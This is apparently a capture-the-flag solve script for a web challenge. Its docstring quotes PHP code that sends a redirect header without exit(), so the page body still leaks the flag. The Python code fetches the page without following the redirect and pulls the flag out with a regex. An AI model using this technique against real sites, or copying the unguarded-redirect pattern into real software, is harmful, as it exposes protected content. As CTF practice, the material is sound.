#!/usr/bin/env python3
"""
redirecting-to-login-page — AlpacaHack Daily 2026-07-13

index.php:
    header("Location: login.php");
    echo "Flag: " . getenv('FLAG');
There is no exit() after header(), so PHP still sends the body. The 302's body
contains the flag — just don't follow the redirect.

Usage: python3 solve.py <host> <port>
"""
import http.client, sys, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
c = http.client.HTTPConnection(HOST, PORT, timeout=15)
c.request("GET", "/index.php")
body = c.getresponse().read().decode(errors="replace")
c.close()
m = re.search(r"Alpaca\{[^}]*\}", body)
print(m.group(0) if m else body)
